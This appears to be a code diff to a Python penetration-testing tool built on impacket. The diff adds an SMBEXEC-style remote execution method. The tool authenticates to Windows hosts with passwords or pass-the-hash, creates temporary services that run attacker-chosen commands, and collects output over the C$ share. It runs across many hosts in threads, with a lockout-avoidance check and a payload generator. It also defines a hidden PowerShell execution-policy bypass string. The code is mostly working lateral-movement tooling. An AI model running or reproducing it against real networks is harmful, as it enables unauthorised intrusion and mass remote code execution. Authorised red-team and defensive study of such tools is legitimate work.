@@ -34,8 +34,18 @@ from impacket.dcerpc.v5.dcomrt import DCOMConnection, COMVERSION
 from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
 from impacket.smbconnection import SMBConnection, SMB_DIALECT, SMB2_DIALECT_002, SMB2_DIALECT_21
 
+try:
+    import ConfigParser
+except ImportError:
+    import configparser as ConfigParser
+
+from threading import Thread
+from impacket import version, smbserver
+from impacket.dcerpc.v5 import transport, scmr
 
 
+BATCH_FILENAME = 'execute.bat'
+SERVICE_NAME = 'BTOBTO'
 OUTPUT_FILENAME = '__' + str(time.time())
 CODEC = sys.stdout.encoding
 timestamp = str(datetime.fromtimestamp(time.time())).replace(' ', '_')
@@ -67,6 +77,185 @@ cwd = os.path.abspath(os.path.dirname(__file__))
 with open('{}/log.txt'.format(cwd), 'a') as f:
     f.write('{}{}{}'.format('\n', timestamp, '\n'))
     f.close()
+
+################################################ Start of SMBEXEC ###############################################################
+
+class CMDEXEC:
+    def __init__(self, command2run='', username='', password='', domain='', hashes=None, aesKey=None, doKerberos=None,
+                 kdcHost=None, share=None, port=445, serviceName=SERVICE_NAME, shell_type=None):
+
+        self.__command2run = command2run
+        self.__username = username
+        self.__password = password
+        self.__port = port
+        self.__serviceName = serviceName
+        self.__domain = domain
+        self.__lmhash = ''
+        self.__nthash = ''
+        self.__aesKey = aesKey
+        self.__doKerberos = doKerberos
+        self.__kdcHost = kdcHost
+        self.__share = share
+        self.__shell_type = shell_type
+        self.shell = None
+        if hashes is not None:
+            self.__lmhash, self.__nthash = hashes.split(':')
+
+    def run(self, remoteName, remoteHost):
+        stringbinding = r'ncacn_np:%s[\pipe\svcctl]' % remoteName
+        logging.debug('StringBinding %s' % stringbinding)
+        rpctransport = transport.DCERPCTransportFactory(stringbinding)
+        rpctransport.set_dport(self.__port)
+        rpctransport.setRemoteHost(remoteHost)
+        if hasattr(rpctransport, 'set_credentials'):
+            # This method exists only for selected protocol sequences.
+            rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash,
+                                         self.__nthash, self.__aesKey)
+        rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)
+
+        self.shell = None
+        try:
+            self.shell = SMBEXECShell(self.__share, rpctransport, self.__serviceName, self.__shell_type, self.__command2run, remoteName)
+        except  (Exception, KeyboardInterrupt) as e:
+            if logging.getLogger().level == logging.DEBUG:
+                import traceback
+                traceback.print_exc()
+            logging.critical(str(e))
+            if self.shell is not None:
+                self.shell.finish()
+            sys.stdout.flush()
+            sys.exit(1)
+
+class SMBEXECShell():
+    def __init__(self, share, rpc, serviceName, shell_type, command2run, addr):
+
+        self.__share = share
+        self.__output = '\\\\127.0.0.1\\' + self.__share + '\\' + OUTPUT_FILENAME
+        self.__batchFile = '%TEMP%\\' + BATCH_FILENAME
+        self.__outputBuffer = b''
+        self.__command = ''
+        self.__shell = '%COMSPEC% /Q /c '
+        self.__shell_type = shell_type
+        self.__pwsh = 'powershell.exe -NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc '
+        self.__serviceName = serviceName
+        self.__rpc = rpc
+
+        self.__scmr = rpc.get_dce_rpc()
+        try:
+            self.__scmr.connect()
+        except Exception as e:
+            logging.critical(str(e))
+            sys.exit(1)
+
+        s = rpc.get_smb_connection()
+
+        # We don't wanna deal with timeouts from now on.
+        s.setTimeout(100000)
+
+        self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
+        resp = scmr.hROpenSCManagerW(self.__scmr)
+        self.__scHandle = resp['lpScHandle']
+        self.transferClient = rpc.get_smb_connection()
+        self.do_cd('', addr)
+        if command2run == 'net use': # so auto drive can work since it does not conatin any & symbols
+            self.send_data(command2run, addr)
+        else:
+            tmphold = self.send_data(command2run[:command2run.find('&')], addr)
+            if (tmphold.find("The command completed successfully") != -1): # SMBEXEC dummy and cant accept && so we must ensure that the net use command worked so we dont delete client shares
+                command2run = command2run[command2run.find('&&')+3:]
+                tmphold = self.send_data(command2run[:command2run.find('&')], addr)
+                command2run = command2run[command2run.find('&&') + 3:]
+                tmphold = self.send_data(command2run[:command2run.find('&')], addr)
+
+    def finish(self):
+        # Just in case the service is still created
+        try:
+            self.__scmr = self.__rpc.get_dce_rpc()
+            self.__scmr.connect()
+            self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
+            resp = scmr.hROpenSCManagerW(self.__scmr)
+            self.__scHandle = resp['lpScHandle']
+            resp = scmr.hROpenServiceW(self.__scmr, self.__scHandle, self.__serviceName)
+            service = resp['lpServiceHandle']
+            scmr.hRDeleteService(self.__scmr, service)
+            scmr.hRControlService(self.__scmr, service, scmr.SERVICE_CONTROL_STOP)
+            scmr.hRCloseServiceHandle(self.__scmr, service)
+        except scmr.DCERPCException:
+            pass
+
+    def do_cd(self, s, addr):
+        # We just can't CD or maintain track of the target dir.
+        if len(s) > 0:
+            logging.error("You can't CD under SMBEXEC. Use full paths.")
+
+        self.execute_remote('cd ', addr)
+        if len(self.__outputBuffer) > 0:
+            # Stripping CR/LF
+            self.prompt = self.__outputBuffer.decode().replace('\r\n','') + '>'
+            if self.__shell_type == 'powershell':
+                self.prompt = 'PS ' + self.prompt + ' '
+            self.__outputBuffer = b''
+
+    def get_output(self):
+        def output_callback(data):
+            self.__outputBuffer += data
+
+        self.transferClient.getFile(self.__share, OUTPUT_FILENAME, output_callback)
+        self.transferClient.deleteFile(self.__share, OUTPUT_FILENAME)
+
+
+    def execute_remote(self, data, addr, shell_type='cmd'):
+
+        command = self.__shell + 'echo ' + data + ' ^> ' + self.__output + ' 2^>^&1 > ' + self.__batchFile + ' & ' + \
+                  self.__shell + self.__batchFile
+
+        command += ' & ' + '%COMSPEC% /Q /c del ' + self.__batchFile
+
+        logging.debug('Executing %s' % command)
+        with open('{}/log.txt'.format(cwd), 'a') as f:
+            f.write('{}: {}\n'.format(addr, 'Executing %s' % command))
+            f.close()
+        resp = scmr.hRCreateServiceW(self.__scmr, self.__scHandle, self.__serviceName, self.__serviceName,
+                                     lpBinaryPathName=command, dwStartType=scmr.SERVICE_DEMAND_START)
+        service = resp['lpServiceHandle']
+
+        try:
+            scmr.hRStartServiceW(self.__scmr, service)
+        except:
+            pass
+        scmr.hRDeleteService(self.__scmr, service)
+        scmr.hRCloseServiceHandle(self.__scmr, service)
+        self.get_output()
+
+    def send_data(self, data, addr):
+        self.execute_remote(data, addr, self.__shell_type)
+        try:
+            data_out = self.__outputBuffer.decode(CODEC)
+            if logging.getLogger().level == logging.DEBUG:
+                print(data_out)
+            with open('{}/drives.txt'.format(cwd), 'a') as f:  # writing to a file gets around the issue of multithreading not being easily readable
+                f.write(data_out)
+                f.close()
+
+            with open('{}/log.txt'.format(cwd), 'a') as f:
+                f.write('{}: {}\n'.format(addr, data_out))
+                f.close()
+
+            return data_out
+        except UnicodeDecodeError:
+            logging.error('Decoding error detected, consider running chcp.com at the target,\nmap the result with '
+                          'https://docs.python.org/3/library/codecs.html#standard-encodings\nand then execute smbexec.py '
+                          'again with -codec and the corresponding codec')
+            print(self.__outputBuffer.decode(CODEC, errors='replace'))
+
+            with open('{}/log.txt'.format(cwd), 'a') as f:
+                f.write('{}: {}\n'.format(addr, self.__outputBuffer.decode(CODEC, errors='replace')))
+                f.close()
+
+        self.__outputBuffer = b''
+
+################################################ End of SMBEXEC ###################################################################
+
 
 ################################################# START OF ATEXEC #########################################################################
 class TSCH_EXEC:
@@ -803,9 +992,14 @@ def alt_exec():
 
 def exec_netuse(ip, domain):
     try:
-        executer = WMIEXEC('net use', username, password, domain, options.hashes, options.aesKey, options.share, False,
-                           options.k, options.dc_ip, 'cmd')
-        executer.run(ip, False)
+        if options.method == 'wmiexec':
+            executer = WMIEXEC('net use', username, password, domain, options.hashes, options.aesKey, options.share,
+                               False, options.k, options.dc_ip, 'cmd')
+            executer.run(ip, False)
+        elif options.method == 'smbexec':
+            executer = CMDEXEC('net use', username, password, domain, options.hashes, options.aesKey, options.k, options.dc_ip,
+                               'C$', 445, options.service_name, 'cmd')
+            executer.run(ip, ip)
     except Exception as e:
         if logging.getLogger().level == logging.DEBUG:
             import traceback
@@ -819,12 +1013,18 @@ def auto_drive(addresses, domain): # really helpful so you dont have to know whi
     print('{}[+]{} Determining the best drive letter to use this may take a moment...'.format(color_BLU, color_reset))
     failed_logons = 0
 
-    if len(addresses) > 3 and options.localauth == False: # Anti lockout check
-        for x in range(3):
+    if len(addresses) > 2 and options.localauth == False: # Anti lockout check
+        for x in range(2):
             try:
-                executer = WMIEXEC('net use', username, password, domain, options.hashes, options.aesKey, options.share,
-                                   False, options.k, options.dc_ip, 'cmd')
-                executer.run(addresses[x], False)
+                if options.method == 'wmiexec':
+                    executer = WMIEXEC('net use', username, password, domain, options.hashes, options.aesKey, options.share,
+                                    False, options.k, options.dc_ip, 'cmd')
+                    executer.run(addresses[x], False)
+                elif options.method == 'smbexec':
+                    executer = CMDEXEC('net use', username, password, domain, options.hashes, options.aesKey, options.k, options.dc_ip,
+                                       'C$', 445, options.service_name, 'cmd')
+                    executer.run(addresses[x], addresses[x])
+
             except Exception as e:
                 if logging.getLogger().level == logging.DEBUG:
                     import traceback
@@ -941,6 +1141,10 @@ def mt_execute(ip): # multithreading requires a function
         elif options.method == 'atexec':
             atsvc_exec = TSCH_EXEC(username, password, domain, options.hashes, options.aesKey, options.k, options.dc_ip, command, None, False)
             atsvc_exec.play(ip)
+        elif options.method == 'smbexec':
+            executer = CMDEXEC(command, username, password, domain, options.hashes, options.aesKey, options.k, options.dc_ip,
+                               'C$', 445, options.service_name, 'cmd')
+            executer.run(ip, ip)
         print("{} {}: Completed".format(green_plus, ip))
     except Exception as e:
         if logging.getLogger().level == logging.DEBUG:
@@ -977,7 +1181,7 @@ if __name__ == '__main__':
     parser.add_argument('-drive', action='store', help='Set the drive letter for the remote device to connect with')
     parser.add_argument('-threads', action='store', type = int, default = 5,help='Set the maximum number of threads default=5')
     parser.add_argument('-timeout', action='store', type=int, default=90, help='Set the timeout in seconds for each thread default=90')
-    parser.add_argument('-method', action='store', default='wmiexec', choices=['wmiexec', 'atexec'], help='Choose a method to execute the commands')
+    parser.add_argument('-method', action='store', default='wmiexec', choices=['wmiexec', 'atexec', 'smbexec'], help='Choose a method to execute the commands')
     parser.add_argument('-ip', action='store', help='Your local ip or network interface for the remote device to connect to')
     parser.add_argument('-codec', action='store', help='Sets encoding used (codec) from the target\'s output (default '
                                                        '"%s"). If errors are detected, run chcp.com at the target, '
@@ -985,7 +1189,8 @@ if __name__ == '__main__':
                                                        'https://docs.python.org/3/library/codecs.html#standard-encodings and then execute wmiexec.py '
                                                        'again with -codec and the corresponding codec ' % CODEC)
     parser.add_argument('-com-version', action='store', metavar="MAJOR_VERSION:MINOR_VERSION", help='DCOM version, format is MAJOR_VERSION:MINOR_VERSION e.g. 5.7')
-
+    parser.add_argument('-service-name', action='store', metavar="service_name", default=SERVICE_NAME,
+                       help='The name of the service used to trigger the payload (SMBEXEC only)')
     group = parser.add_argument_group('authentication')
     group.add_argument('-localauth', action='store_true', default = False, help='Authenticate with a local account to the machine')
     group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH or just NTHASH')
@@ -1110,7 +1315,7 @@ if __name__ == '__main__':
         print("\n[share-info]\nShare location: /var/tmp/{}\nUsername: {}\nPassword: {}\n".format(share_name, share_user,share_pass))
 
         # automatically find the best drive to use
-        if options.drive is None and options.method == 'wmiexec' and options.oe == False:
+        if options.drive is None and (options.method == 'wmiexec' or options.method == 'smbexec') and options.oe == False:
             drive_letter = auto_drive(addresses, domain)
 
         gen_payload(share_name, payload_name, drive_letter) # creates the payload
